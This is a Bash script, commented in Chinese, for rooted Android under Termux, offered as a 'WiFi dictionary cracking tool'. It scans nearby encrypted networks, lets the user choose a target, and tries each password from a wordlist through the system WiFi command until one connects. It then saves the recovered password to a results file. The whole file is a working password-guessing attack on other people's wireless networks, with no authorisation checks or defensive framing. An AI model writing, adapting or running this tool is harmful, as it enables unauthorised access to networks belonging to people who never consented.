#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# WiFi 字典破解工具 v2.0 (Termux + Root)
# 原理: 通过 cmd wifi connect-network 逐个尝试字典中的密码
# ============================================================

# ── 颜色 ──
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ── 全局变量 ──
# 使用固定路径, 避免 sudo 下 HOME 变化
REAL_HOME="/data/data/com.termux/files/home"
DICT_DIR="$REAL_HOME/wifi-dicts"
RESULT_DIR="$REAL_HOME/wifi-results"
TEMP_DIR="$REAL_HOME/.wifi-crack-tmp"
CONNECT_TIMEOUT=5

# ── 工具函数 ──
info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
error() { echo -e "${RED}[-]${NC} $*"; }
die()   { error "$*"; exit 1; }

check_root() {
    [[ $EUID -eq 0 ]] || die "需要 root 权限, 请用 sudo 运行"
}

check_deps() {
    local missing=()
    for cmd in cmd iw; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if (( ${#missing[@]} > 0 )); then
        warn "缺少依赖: ${missing[*]}"
        info "正在安装..."
        pkg update -yqq && pkg install -y iw 2>/dev/null
    fi
}

setup_dirs() {
    mkdir -p "$DICT_DIR" "$RESULT_DIR" "$TEMP_DIR"
}

# ── 断开当前 WiFi ──
disconnect_wifi() {
    local status
    status=$(cmd wifi status </dev/null 2>/dev/null)
    if echo "$status" | grep -q "Wifi is connected"; then
        local current_ssid
        current_ssid=$(echo "$status" | grep "SSID:" | head -1 | sed 's/.*SSID: "\([^"]*\)".*/\1/')
        info "当前已连接: ${BOLD}${current_ssid}${NC}"
        echo -ne "  断开并尝试破解其他网络? [y/N]: "
        read -r confirm
        if [[ "$confirm" =~ ^[Yy]$ ]]; then
            # 获取当前网络 ID 并忘记它
            local net_id
            net_id=$(cmd wifi list-networks 2>/dev/null | grep "$current_ssid" | head -1 | awk '{print $1}')
            if [[ -n "$net_id" ]]; then
        cmd wifi forget-network "$net_id" </dev/null >/dev/null 2>&1 || true
                info "已断开并忘记网络: $current_ssid"
                sleep 1
            fi
        else
            die "取消操作"
        fi
    fi
}

# ── 扫描 WiFi ──
scan_wifi() {
    info "正在扫描附近 WiFi..."
    cmd wifi start-scan 2>/dev/null || true
    sleep 3

    # 解析扫描结果
    > "$TEMP_DIR/networks.txt"
    cmd wifi list-scan-results 2>/dev/null | tail -n +2 | while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        local bssid freq rssi ssid flags
        bssid=$(echo "$line" | awk '{print $1}')
        freq=$(echo "$line" | awk '{print $2}')
        rssi=$(echo "$line" | awk '{print $3}')
        # 第5字段是 SSID, 第6字段开始是 [FLAGS]
        ssid=$(echo "$line" | awk '{print $5}' | sed 's/ *$//')
        flags=$(echo "$line" | grep -o '\[[^]]*\]')
        
        # 跳过空 SSID 和开放网络
        [[ -z "$ssid" || "$ssid" == " " ]] && continue
        echo "$flags" | grep -q "WPA\|WEP\|PSK" || continue
        
        # 判断加密类型
        local enc="wpa2"
        echo "$flags" | grep -q "WPA3\|SAE" && enc="wpa3"
        echo "$flags" | grep -q "WEP" && enc="wep"
        
        echo -e "${bssid}\t${freq}\t${rssi}\t${enc}\t${ssid}" >> "$TEMP_DIR/networks.txt"
    done

    # 去重 (同一 SSID 可能有多个 BSSID)
    sort -t$'\t' -k5,5 -u "$TEMP_DIR/networks.txt" > "$TEMP_DIR/networks_unique.txt"
    mv "$TEMP_DIR/networks_unique.txt" "$TEMP_DIR/networks.txt"

    local count
    count=$(wc -l < "$TEMP_DIR/networks.txt" 2>/dev/null || echo 0)
    count=$(echo "$count" | tr -d ' ')
    if [[ "$count" -eq 0 ]]; then
        die "未扫描到加密的 WiFi 网络"
    fi
    info "扫描到 ${BOLD}${count}${NC} 个加密网络"
}

show_networks() {
    echo ""
    echo -e "${BOLD}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}  #   信号    加密    BSSID                SSID${NC}"
    echo -e "${BOLD}═══════════════════════════════════════════════════════════════${NC}"
    local i=1
    while IFS=$'\t' read -r bssid freq rssi enc ssid; do
        local bars=""
        local pct=$(( (rssi + 100) ))
        if (( pct >= 70 )); then bars="█████"
        elif (( pct >= 55 )); then bars="████░"
        elif (( pct >= 40 )); then bars="███░░"
        elif (( pct >= 25 )); then bars="██░░░"
        else bars="█░░░░"
        fi
        printf "  ${CYAN}%2d${NC}  %s %3d%%  %-5s %-18s %s\n" "$i" "$bars" "$pct" "$enc" "$bssid" "$ssid"
        i=$((i + 1))
    done < "$TEMP_DIR/networks.txt"
    echo -e "${BOLD}═══════════════════════════════════════════════════════════════${NC}"
}

select_target() {
    local count
    count=$(wc -l < "$TEMP_DIR/networks.txt" | tr -d ' ')
    while true; do
        echo -ne "\n选择目标 [1-$count]: "
        read -r choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= count )); then
            TARGET_LINE=$(sed -n "${choice}p" "$TEMP_DIR/networks.txt")
            TARGET_BSSID=$(echo "$TARGET_LINE" | cut -f1)
            TARGET_FREQ=$(echo "$TARGET_LINE" | cut -f2)
            TARGET_SSID=$(echo "$TARGET_LINE" | cut -f5 | sed 's/ *$//')
            TARGET_ENC=$(echo "$TARGET_LINE" | cut -f4)
            info "目标: ${BOLD}${TARGET_SSID}${NC} (${TARGET_BSSID}) [$TARGET_ENC]"
            return 0
        fi
        error "请输入 1-$count 之间的数字"
    done
}

# ── 字典管理 ──
DICT_FILE="$REAL_HOME/幻影WiFi字典.txt"

check_dict() {
    if [[ ! -f "$DICT_FILE" ]]; then
        die "字典文件不存在: $DICT_FILE"
    fi
    DICT_TOTAL=$(wc -l < "$DICT_FILE" | tr -d ' ')
    info "字典: ${BOLD}幻影WiFi字典.txt${NC} (${DICT_TOTAL} 个密码)"
}

# ── 核心破解逻辑 ──
try_connect() {
    local ssid="$1"
    local password="$2"
    local bssid="$3"
    local enc="$4"

    local bssid_opt=""
    [[ -n "$bssid" ]] && bssid_opt="-b $bssid"
    
    cmd wifi connect-network "$ssid" "$enc" "$password" $bssid_opt </dev/null >/dev/null 2>&1 || true
    
    # 等待连接成功或超时 (最多 5 秒)
    local i
    for i in $(seq 1 10); do
        sleep 0.5
        local status
        status=$(cmd wifi status </dev/null 2>/dev/null)
        if echo "$status" | grep -q "Wifi is connected to"; then
            local connected_ssid
            connected_ssid=$(echo "$status" | grep -o 'Wifi is connected to "[^"]*"' | sed 's/Wifi is connected to "\([^"]*\)"/\1/')
            if [[ "$connected_ssid" == "$ssid" ]]; then
                local net_id
                net_id=$(cmd wifi list-networks </dev/null 2>/dev/null | grep "$ssid" | head -1 | awk '{print $1}')
                [[ -n "$net_id" ]] && cmd wifi forget-network "$net_id" </dev/null >/dev/null 2>&1 || true
                return 0
            fi
        fi
    done
    
    # 超时, 清理
    local net_id
    net_id=$(cmd wifi list-networks </dev/null 2>/dev/null | grep "$ssid" | head -1 | awk '{print $1}')
    [[ -n "$net_id" ]] && cmd wifi forget-network "$net_id" </dev/null >/dev/null 2>&1 || true
    return 1
}

run_crack() {
    local total=$DICT_TOTAL
    local tried=0
    local found=0
    local start_time
    start_time=$(date +%s)

    local result_file="$RESULT_DIR/${TARGET_SSID//[^a-zA-Z0-9]/_}_$(date +%Y%m%d_%H%M%S).txt"

    echo ""
    echo -e "${BOLD}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "  目标: ${CYAN}${TARGET_SSID}${NC}"
    echo -e "  BSSID: ${TARGET_BSSID}"
    echo -e "  加密: ${TARGET_ENC}"
    echo -e "  字典: ${BOLD}幻影WiFi字典.txt${NC} (${total} 个密码)"
    echo -e "  结果: ${result_file}"
    echo -e "${BOLD}═══════════════════════════════════════════════════════════════${NC}"
    echo ""

    while IFS= read -r password; do
        password=$(echo "$password" | tr -d '\r')
        tried=$((tried + 1))

        # 显示进度
        local pct=$(( tried * 100 / total ))
        local elapsed=$(( $(date +%s) - start_time ))
        local speed=""
        if (( elapsed > 0 )); then
            speed=" | $(( tried / elapsed )) 密码/秒"
        fi
        echo -ne "\r${CYAN}[${pct}%]${NC} ${tried}/${total}${speed}  尝试: ${password}          " >&2

        # 尝试连接
        if try_connect "$TARGET_SSID" "$password" "$TARGET_BSSID" "$TARGET_ENC"; then
            echo ""
            echo ""
            echo -e "${GREEN}${BOLD}╔══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}${BOLD}║         密码破解成功!               ║${NC}"
            echo -e "${GREEN}${BOLD}╚══════════════════════════════════════╝${NC}"
            echo -e "  网络: ${BOLD}${TARGET_SSID}${NC}"
            echo -e "  密码: ${BOLD}${GREEN}${password}${NC}"
            echo -e "  尝试: ${tried}/${total}"
            echo -e "  耗时: $(date -d@${elapsed} -u +%H:%M:%S 2>/dev/null || echo "${elapsed}秒")"
            echo ""
            # 保存结果
            {
                echo "网络: $TARGET_SSID"
                echo "BSSID: $TARGET_BSSID"
                echo "密码: $password"
                echo "时间: $(date)"
            } > "$result_file"
            info "结果已保存: $result_file"
            found=1
            break
        fi
    done < "$DICT_FILE"

    echo ""
    if (( found == 0 )); then
        warn "字典跑完, 未找到密码"
        local elapsed=$(( $(date +%s) - start_time ))
        info "共尝试 ${tried} 个密码, 耗时 $(date -d@${elapsed} -u +%H:%M:%S 2>/dev/null || echo "${elapsed}秒")"
    fi
}

# ── 快速模式: 指定密码直接试 ──
quick_try() {
    local ssid="$1"
    local password="$2"
    local enc="${3:-wpa2}"
    info "快速尝试: ${BOLD}${ssid}${NC} -> ${password}"
    if try_connect "$ssid" "$password" "" "$enc"; then
        info "${GREEN}密码正确: ${password}${NC}"
    else
        warn "密码错误"
    fi
}

# ── 查看结果 ──
show_results() {
    echo ""
    if ls "$RESULT_DIR"/*.txt &>/dev/null; then
        for f in "$RESULT_DIR"/*.txt; do
            echo -e "  ${BOLD}--- $(basename "$f") ---${NC}"
            cat "$f"
            echo ""
        done
    else
        warn "没有已保存的结果"
    fi
}

# ── 主菜单 ──
show_banner() {
    echo ""
    echo -e "${CYAN}${BOLD}"
    echo "  ╔════════════════════════════════════════════╗"
    echo "  ║     WiFi 字典破解工具 v2.0                ║"
    echo "  ║     Termux + Root + cmd wifi              ║"
    echo "  ╚════════════════════════════════════════════╝"
    echo -e "${NC}"
}

main_menu() {
    while true; do
        echo ""
        echo -e "  ${BOLD}1${NC}. 扫描并选择目标"
        echo -e "  ${BOLD}2${NC}. 快速尝试密码"
        echo -e "  ${BOLD}3${NC}. 查看已保存的结果"
        echo -e "  ${BOLD}0${NC}. 退出"
        echo ""
        echo -ne "  选择: "
        read -r opt
        case "$opt" in
            1)
                disconnect_wifi
                scan_wifi
                show_networks
                select_target
                check_dict
                run_crack
                ;;
            2)
                echo -ne "  SSID: "; read -r qssid
                echo -ne "  密码: "; read -rs qpass; echo ""
                echo -ne "  加密类型 [wpa2/wpa3]: "; read -r qenc
                qenc="${qenc:-wpa2}"
                quick_try "$qssid" "$qpass" "$qenc"
                ;;
            3)
                show_results
                ;;
            0)
                info "退出"
                rm -rf "$TEMP_DIR"
                exit 0
                ;;
            *)
                error "无效选择"
                ;;
        esac
    done
}

# ── 入口 ──
main() {
    check_root
    check_deps
    setup_dirs
    show_banner

    # 命令行快捷模式
    if (( $# >= 1 )); then
        case "$1" in
            -s|--scan)
                scan_wifi; show_networks; exit 0 ;;
            -t|--target)
                shift
                TARGET_SSID="${1:-}"
                TARGET_BSSID="${2:-}"
                TARGET_ENC="${3:-wpa2}"
                DICT_FILE="${4:-$DICT_DIR/幻影WiFi字典.txt}"
                [[ -z "$TARGET_SSID" ]] && die "用法: $0 -t <SSID> [BSSID] [加密类型] [字典文件]"
                check_dict
                run_crack
                exit 0
                ;;
            -q|--quick)
                shift
                quick_try "${1:-}" "${2:-}" "${3:-wpa2}"
                ;;
            -h|--help)
                echo "用法:"
                echo "  $0                  交互式菜单"
                echo "  $0 -s               扫描 WiFi"
                echo "  $0 -t SSID [BSSID] [加密]  指定目标破解"
                echo "  $0 -q SSID 密码 [加密]  快速尝试"
                exit 0
                ;;
        esac
    fi

    main_menu
}

main "$@"
